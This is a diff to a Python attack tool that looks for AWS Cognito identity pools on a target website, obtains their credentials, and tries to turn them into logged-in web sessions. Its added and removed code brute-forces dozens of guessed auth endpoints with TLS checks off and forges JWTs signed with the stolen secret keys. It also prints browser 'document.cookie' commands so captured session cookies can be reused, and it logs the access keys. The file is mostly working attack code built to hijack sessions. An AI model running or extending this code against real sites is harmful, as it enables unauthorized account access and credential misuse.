@@ -17,171 +17,6 @@ import base64
 import urllib3
 urllib3.disable_warnings()
 
-class WebSessionConverter:
-    def __init__(self, base_url, credentials, identity_id):
-        self.base_url = base_url
-        self.credentials = credentials
-        self.identity_id = identity_id
-        self.session = requests.Session()
-        self.logger = logging.getLogger('WebSessionConverter')
-
-    def convert_to_web_session(self):
-        """Try all known methods to convert AWS credentials to web session"""
-        results = {}
-        
-        # 1. Try Direct AWS Credentials Exchange
-        auth_payloads = [
-            {
-                "IdentityId": self.identity_id,
-                "Credentials": {
-                    "AccessKeyId": self.credentials.get('AccessKeyId'),
-                    "SecretKey": self.credentials.get('SecretKey'),
-                    "SessionToken": self.credentials.get('SessionToken')
-                }
-            },
-            {
-                "aws_access_key_id": self.credentials.get('AccessKeyId'),
-                "aws_secret_access_key": self.credentials.get('SecretKey'),
-                "aws_session_token": self.credentials.get('SessionToken')
-            },
-            {
-                "token": self.credentials.get('SessionToken'),
-                "identityId": self.identity_id,
-                "provider": "cognito-identity"
-            }
-        ]
-
-        # Common + specific endpoints based on research
-        auth_endpoints = [
-            '/api/auth/aws',
-            '/api/auth/session',
-            '/api/v1/auth',
-            '/api/v1/auth/session',
-            '/api/v1/auth/aws',
-            '/auth/session',
-            '/auth/aws-credentials',
-            '/auth/token-exchange',
-            '/session/token',
-            '/api/session',
-            '/authenticate',
-            '/auth/signin',
-            '/auth/cognito/token',
-            '/v1/auth/cognito'
-        ]
-
-        headers = {
-            'Content-Type': 'application/json',
-            'X-Amz-Security-Token': self.credentials.get('SessionToken'),
-            'X-Amz-Access-Key-Id': self.credentials.get('AccessKeyId'),
-            'Authorization': f'AWS4-HMAC-SHA256 Credential={self.credentials.get("AccessKeyId")}',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
-        }
-
-        for endpoint in auth_endpoints:
-            for payload in auth_payloads:
-                try:
-                    url = urljoin(self.base_url, endpoint)
-                    response = requests.post(
-                        url,
-                        json=payload,
-                        headers=headers,
-                        verify=False,
-                        allow_redirects=True
-                    )
-                    self.logger.debug(f"Trying {endpoint} - Status: {response.status_code}")
-                    
-                    if response.status_code in [200, 302]:
-                        results['direct_exchange'] = {
-                            'endpoint': endpoint,
-                            'cookies': dict(response.cookies),
-                            'headers': dict(response.headers),
-                            'response': response.text[:200]
-                        }
-                        return results
-
-                except Exception as e:
-                    self.logger.debug(f"Failed endpoint {endpoint}: {str(e)}")
-
-        # 2. Try OAuth/OIDC Flow
-        try:
-            oauth_endpoints = [
-                '/.well-known/openid-configuration',
-                '/oauth2/authorize',
-                '/oauth2/token'
-            ]
-
-            for endpoint in oauth_endpoints:
-                url = urljoin(self.base_url, endpoint)
-                params = {
-                    'identity_id': self.identity_id,
-                    'access_token': self.credentials.get('SessionToken'),
-                    'response_type': 'token',
-                    'client_id': 'aws-cognito'
-                }
-                
-                response = requests.get(url, params=params, verify=False)
-                if response.status_code in [200, 302]:
-                    results['oauth'] = {
-                        'endpoint': endpoint,
-                        'location': response.headers.get('Location'),
-                        'cookies': dict(response.cookies)
-                    }
-                    return results
-
-        except Exception as e:
-            self.logger.debug(f"OAuth flow failed: {str(e)}")
-
-        # 3. Try AWS STS Token Exchange
-        try:
-            sts_client = boto3.client('sts',
-                aws_access_key_id=self.credentials.get('AccessKeyId'),
-                aws_secret_access_key=self.credentials.get('SecretKey'),
-                aws_session_token=self.credentials.get('SessionToken')
-            )
-            
-            assumed_role = sts_client.get_caller_identity()
-            
-            # Try web exchange with role info
-            auth_url = urljoin(self.base_url, '/api/auth/sts')
-            response = requests.post(auth_url, 
-                json={'caller_identity': assumed_role},
-                headers=headers,
-                verify=False
-            )
-            
-            if response.status_code == 200:
-                results['sts_exchange'] = {
-                    'cookies': dict(response.cookies),
-                    'headers': dict(response.headers)
-                }
-                return results
-
-        except Exception as e:
-            self.logger.debug(f"STS exchange failed: {str(e)}")
-
-        # 4. Try Custom Token Exchange
-        try:
-            custom_headers = {
-                'X-Identity-Id': self.identity_id,
-                'X-Cognito-Token': self.credentials.get('SessionToken'),
-                'X-AWS-Token': self.credentials.get('SessionToken')
-            }
-            
-            auth_url = urljoin(self.base_url, '/api/auth')
-            response = requests.post(auth_url, headers={**headers, **custom_headers}, verify=False)
-            
-            if response.status_code == 200:
-                results['custom_exchange'] = {
-                    'cookies': dict(response.cookies),
-                    'headers': dict(response.headers)
-                }
-                return results
-
-        except Exception as e:
-            self.logger.debug(f"Custom exchange failed: {str(e)}")
-
-        return None
-
 class AWSCognitoAnalyzer:
     def __init__(self):
         self.session = requests.Session()
@@ -290,11 +125,54 @@ class AWSCognitoAnalyzer:
                 
         return results if results else None
 
+class WebSessionManager:
+    def __init__(self, base_url):
+        self.base_url = base_url.replace("_js", "") # Fix URL issue
+        self.session = requests.Session()
+        self.logger = logging.getLogger('WebSessionManager')
+
+    def test_session(self, session_data):
+        """Test if a web session is valid"""
+        results = {}
+        
+        common_endpoints = [
+            '/api/user/profile',
+            '/api/me',
+            '/api/account',
+            '/dashboard',
+            '/home'
+        ]
+        
+        for endpoint in common_endpoints:
+            url = urljoin(self.base_url, endpoint)
+            
+            try:
+                headers = {}
+                if 'token' in session_data:
+                    headers['Authorization'] = f'Bearer {session_data["token"]}'
+                
+                cookies = session_data.get('cookies', {})
+                
+                response = requests.get(url, headers=headers, cookies=cookies, verify=False)
+                
+                if response.status_code == 200:
+                    results[endpoint] = {
+                        'status': response.status_code,
+                        'content_type': response.headers.get('content-type'),
+                        'body_preview': response.text[:200]
+                    }
+                    
+            except Exception as e:
+                self.logger.debug(f"Test failed for {endpoint}: {str(e)}")
+                
+        return results if results else None
+
 class AWSIdentityValidator:
     def __init__(self, base_url):
         self.session = requests.Session()
         self.logger = logging.getLogger('AWSIdentityValidator')
-        self.base_url = base_url
+        self.web_session_manager = WebSessionManager(base_url)
+        self.base_url = base_url.replace("_js", "") # Fix URL issue
 
     def validate_identity_pool(self, identity_pool_id, region=None):
         """Attempt to get identity credentials"""
@@ -342,6 +220,228 @@ class AWSIdentityValidator:
             self.logger.error(f"Error getting credentials: {str(e)}")
         return None
 
+    def try_web_session_conversion(self, identity_id, credentials):
+        """Try all known methods to convert to web session"""
+        results = {}
+        
+        # Method 1: Try SDK token exchange
+        try:
+            aws_auth_headers = {
+                'Authorization': f'AWS4-HMAC-SHA256 Credential={credentials.get("AccessKeyId")}',
+                'X-Amz-Security-Token': credentials.get('SessionToken'),
+                'X-Amz-Access-Key-Id': credentials.get('AccessKeyId'),
+                'X-Amz-Secret-Key': credentials.get('SecretKey')
+            }
+            
+            # Try SDK token exchange endpoints
+            sdk_endpoints = [
+                '/.cognito/identity/authorize',
+                '/.cognito/oauth2/token',
+                '/.cognito/token',
+                '/oauth2/token'
+            ]
+            
+            for endpoint in sdk_endpoints:
+                try:
+                    url = urljoin(self.base_url, endpoint)
+                    response = requests.post(url, headers=aws_auth_headers, verify=False)
+                    if response.status_code in [200, 302]:
+                        results['sdk_token'] = {
+                            'endpoint': endpoint,
+                            'cookies': dict(response.cookies),
+                            'headers': dict(response.headers)
+                        }
+                        break
+                except Exception as e:
+                    self.logger.debug(f"SDK endpoint {endpoint} failed: {str(e)}")
+        except Exception as e:
+            self.logger.debug(f"SDK token exchange failed: {str(e)}")
+
+        # Method 2: Try Cognito hosted UI with credentials
+        try:
+            # Get OIDC configuration
+            config_url = urljoin(self.base_url, '/.well-known/openid-configuration')
+            config_response = requests.get(config_url, verify=False)
+            
+            if config_response.status_code == 200:
+                config = config_response.json()
+                authorize_endpoint = config.get('authorization_endpoint')
+                
+                if authorize_endpoint:
+                    auth_params = {
+                        'client_id': 'aws-cognito',
+                        'response_type': 'token',
+                        'scope': 'openid profile',
+                        'nonce': str(uuid.uuid4()),
+                        'state': str(uuid.uuid4()),
+                        'identity_id': identity_id,
+                        'aws_credentials': json.dumps({
+                            'AccessKeyId': credentials.get('AccessKeyId'),
+                            'SecretKey': credentials.get('SecretKey'),
+                            'SessionToken': credentials.get('SessionToken')
+                        })
+                    }
+                    
+                    auth_response = requests.get(authorize_endpoint, params=auth_params, allow_redirects=False, verify=False)
+                    if auth_response.status_code in [302, 200]:
+                        results['hosted_ui'] = {
+                            'location': auth_response.headers.get('Location'),
+                            'cookies': dict(auth_response.cookies)
+                        }
+        except Exception as e:
+            self.logger.debug(f"Hosted UI flow failed: {str(e)}")
+
+        # Method 3: Try AWS Web Identity Flow
+        try:
+            # Get STS credentials
+            sts_client = boto3.client('sts',
+                aws_access_key_id=credentials.get('AccessKeyId'),
+                aws_secret_access_key=credentials.get('SecretKey'),
+                aws_session_token=credentials.get('SessionToken')
+            )
+            
+            # Get caller identity
+            caller = sts_client.get_caller_identity()
+            assumed_role_arn = caller['Arn']
+            
+            # Try exchanging role info for session
+            auth_url = urljoin(self.base_url, '/api/auth/aws')
+            headers = {
+                'Content-Type': 'application/json',
+                'X-AWS-ARN': assumed_role_arn
+            }
+            
+            role_response = requests.post(auth_url, 
+                headers=headers,
+                json={'role_arn': assumed_role_arn},
+                verify=False
+            )
+            
+            if role_response.status_code == 200:
+                results['role_exchange'] = {
+                    'cookies': dict(role_response.cookies),
+                    'headers': dict(role_response.headers),
+                    'response': role_response.json() if role_response.text else None
+                }
+        except Exception as e:
+            self.logger.debug(f"Role exchange failed: {str(e)}")
+
+        # Method 4: Try Browser SDK flow
+        try:
+            js_params = {
+                'identityId': identity_id,
+                'accessKeyId': credentials.get('AccessKeyId'),
+                'secretKey': credentials.get('SecretKey'),
+                'sessionToken': credentials.get('SessionToken'),
+                'region': 'us-west-2'
+            }
+            
+            # Emulate browser SDK calls
+            auth_url = urljoin(self.base_url, '/api/auth/session')
+            sdk_response = requests.post(auth_url, json=js_params, verify=False)
+            
+            if sdk_response.status_code == 200:
+                results['browser_sdk'] = {
+                    'cookies': dict(sdk_response.cookies),
+                    'headers': dict(sdk_response.headers),
+                    'response': sdk_response.json() if sdk_response.text else None
+                }
+        except Exception as e:
+            self.logger.debug(f"Browser SDK flow failed: {str(e)}")
+
+        # Method 5: Try JWT token exchange
+        try:
+            jwt_headers = {
+                'Content-Type': 'application/json',
+                'X-Identity-Token': credentials.get('SessionToken')
+            }
+
+            jwt_payload = {
+                'sub': identity_id,
+                'iss': self.base_url,
+                'aud': 'aws-cognito',
+                'token_use': 'access',
+                'auth_time': int(datetime.utcnow().timestamp()),
+                'exp': int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
+                'iat': int(datetime.utcnow().timestamp()),
+                'jti': str(uuid.uuid4()),
+                'client_id': 'aws-cognito',
+                'username': identity_id,
+                'cognito:groups': ['aws-identity'],
+                'aws:credentials': {
+                    'AccessKeyId': credentials.get('AccessKeyId'),
+                    'SecretKey': credentials.get('SecretKey'),
+                    'SessionToken': credentials.get('SessionToken')
+                }
+            }
+
+            # Try signing with different keys
+            signing_keys = [
+                credentials.get('SecretKey'),
+                base64.b64encode(credentials.get('SecretKey', '').encode()).decode(),
+                credentials.get('SessionToken')
+            ]
+
+            for key in signing_keys:
+                try:
+                    token = jwt.encode(jwt_payload, key, algorithm='HS256')
+                    jwt_headers['Authorization'] = f'Bearer {token}'
+                    
+                    # Try JWT token endpoints
+                    jwt_endpoints = ['/api/auth/jwt', '/api/auth/token', '/auth/jwt']
+                    
+                    for endpoint in jwt_endpoints:
+                        jwt_url = urljoin(self.base_url, endpoint)
+                        jwt_response = requests.post(jwt_url, headers=jwt_headers, verify=False)
+                        
+                        if jwt_response.status_code == 200:
+                            results['jwt_exchange'] = {
+                                'endpoint': endpoint,
+                                'token': token,
+                                'cookies': dict(jwt_response.cookies),
+                                'headers': dict(jwt_response.headers)
+                            }
+                            break
+                except:
+                    continue
+        except Exception as e:
+            self.logger.debug(f"JWT exchange failed: {str(e)}")
+
+        # Method 6: Try direct API access with credentials
+        try:
+            api_headers = {
+                'X-Amz-Security-Token': credentials.get('SessionToken'),
+                'X-Amz-Access-Key-Id': credentials.get('AccessKeyId'),
+                'X-Amz-Secret-Access-Key': credentials.get('SecretKey'),
+            }
+            
+            api_endpoints = ['/api/auth', '/api/v1/auth', '/api/session']
+            
+            for endpoint in api_endpoints:
+                try:
+                    api_url = urljoin(self.base_url, endpoint)
+                    api_response = requests.post(api_url, headers=api_headers, verify=False)
+                    
+                    if api_response.status_code == 200:
+                        results['api_access'] = {
+                            'endpoint': endpoint,
+                            'cookies': dict(api_response.cookies),
+                            'headers': dict(api_response.headers)
+                        }
+                        break
+                except Exception as e:
+                    self.logger.debug(f"API access failed for {endpoint}: {str(e)}")
+        except Exception as e:
+            self.logger.debug(f"API access failed: {str(e)}")
+            
+        # Log debug info for manual investigation
+        self.logger.debug("Debug Info:")
+        self.logger.debug(f"Identity ID: {identity_id}")
+        self.logger.debug(f"Access Key: {credentials.get('AccessKeyId')}")
+        self.logger.debug(f"Assumed Role: {caller['Arn'] if 'caller' in locals() else 'Unknown'}")
+        
+        return results if results else None
+
 def process_aws_configs(configs, analyzer):
     """Process discovered AWS configurations"""
     if not configs:
@@ -351,7 +451,7 @@ def process_aws_configs(configs, analyzer):
     base_url = None
     for url in configs.keys():
         if url.startswith('http'):
-            base_url = url
+            base_url = url.replace("_js", "")  # Fix URL issue
             break
             
     if not base_url:
@@ -367,10 +467,10 @@ def process_aws_configs(configs, analyzer):
     # Extract unique identity pools
     for url_data in configs.values():
         if isinstance(url_data, dict):
-            for config in url_data.values():
-                if isinstance(config, dict):
-                    if 'identity_pool_id' in config:
-                        pool_id = config['identity_pool_id']
+            for url_configs in url_data.values():
+                if isinstance(url_configs, dict):
+                    if 'identity_pool_id' in url_configs:
+                        pool_id = url_configs['identity_pool_id']
                         if pool_id not in results['identity_pools']:
                             results['identity_pools'].append(pool_id)
     
@@ -390,23 +490,31 @@ def process_aws_configs(configs, analyzer):
                 
                 # Try web session conversion
                 print("\nAttempting web session conversion...")
-                converter = WebSessionConverter(base_url, credentials, identity_id)
-                web_session = converter.convert_to_web_session()
+                web_sessions = validator.try_web_session_conversion(identity_id, credentials)
                 
-                if web_session:
-                    print("Successfully converted to web session!")
-                    print("\nTo use this session in your browser:")
-                    if 'direct_exchange' in web_session:
-                        for cookie_name, cookie_value in web_session['direct_exchange']['cookies'].items():
-                            print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
-                    
+                if web_sessions:
+                    print("Successfully obtained web sessions!")
+                    print("\nWeb Session Details:")
+                    for method, session in web_sessions.items():
+                        print(f"\nMethod: {method}")
+                        if 'cookies' in session:
+                            print("\nCookie Commands:")
+                            for cookie_name, cookie_value in session['cookies'].items():
+                                print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
+                        if 'token' in session:
+                            print(f"\nAuthorization: Bearer {session['token']}")
+                        
                     results['web_sessions'].append({
                         'identity_pool_id': pool_id,
                         'identity_id': identity_id,
-                        'session': web_session
+                        'sessions': web_sessions
                     })
                 else:
                     print("Failed to convert to web session")
+                    print("\nDebug Information:")
+                    print(f"Identity ID: {identity_id}")
+                    print(f"Access Key ID: {credentials.get('AccessKeyId')}")
+                    print(f"Session Token Length: {len(credentials.get('SessionToken', ''))}")
                 
                 results['validations'].append({
                     'type': 'identity_pool',
@@ -420,7 +528,7 @@ def process_aws_configs(configs, analyzer):
     return results
 
 def main():
-    parser = argparse.ArgumentParser(description="AWS Cognito Analyzer with Web Session Converter")
+    parser = argparse.ArgumentParser(description="Advanced AWS Cognito Analyzer")
     parser.add_argument('-u', '--url', help="Target URL to analyze")
     parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose logging")
     parser.add_argument('-o', '--output', help="Output file for results")
@@ -440,7 +548,9 @@ def main():
         parser.print_help()
         sys.exit(1)
 
-    results = {}
+    # Disable SSL warnings if using insecure mode
+    if args.insecure:
+        urllib3.disable_warnings()
 
     # If credentials are provided directly
     if args.creds and args.identity:
@@ -450,17 +560,20 @@ def main():
             'SecretKey': secret_key,
             'SessionToken': session_token
         }
-        converter = WebSessionConverter(args.url, credentials, args.identity)
-        web_session = converter.convert_to_web_session()
+        
+        validator = AWSIdentityValidator(args.url)
+        web_session = validator.try_web_session_conversion(args.identity, credentials)
         
         if web_session:
-            print("\nSuccessfully converted existing credentials to web session!")
-            print(json.dumps(web_session, indent=2, default=str))
-            
-            if 'direct_exchange' in web_session:
-                print("\nTo use this session in your browser:")
-                for cookie_name, cookie_value in web_session['direct_exchange']['cookies'].items():
-                    print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
+            print("\nSuccessfully converted credentials to web session!")
+            for method, session in web_session.items():
+                print(f"\nMethod: {method}")
+                if 'cookies' in session:
+                    print("\nCookie Commands:")
+                    for cookie_name, cookie_value in session['cookies'].items():
+                        print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
+                if 'token' in session:
+                    print(f"\nAuthorization: Bearer {session['token']}")
             
             if args.output:
                 with open(args.output, 'w') as f:
@@ -468,7 +581,7 @@ def main():
                 print(f"\nResults saved to {args.output}")
             sys.exit(0)
 
-    # Otherwise perform full analysis
+    # Full analysis mode
     analyzer = AWSCognitoAnalyzer()
     configs = analyzer.analyze_url(args.url)
     
@@ -487,16 +600,6 @@ def main():
                 with open(args.output, 'w') as f:
                     json.dump(results, f, indent=2, default=str)
                 print(f"\nResults saved to {args.output}")
-            
-            # Print any usable web sessions
-            if results.get('web_sessions'):
-                print("\nUsable Web Sessions Found!")
-                for session in results['web_sessions']:
-                    print(f"\nIdentity Pool: {session['identity_pool_id']}")
-                    if 'direct_exchange' in session.get('session', {}):
-                        print("Browser Cookie Commands:")
-                        for cookie_name, cookie_value in session['session']['direct_exchange']['cookies'].items():
-                            print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
         else:
             print("No successful validations")
     else:
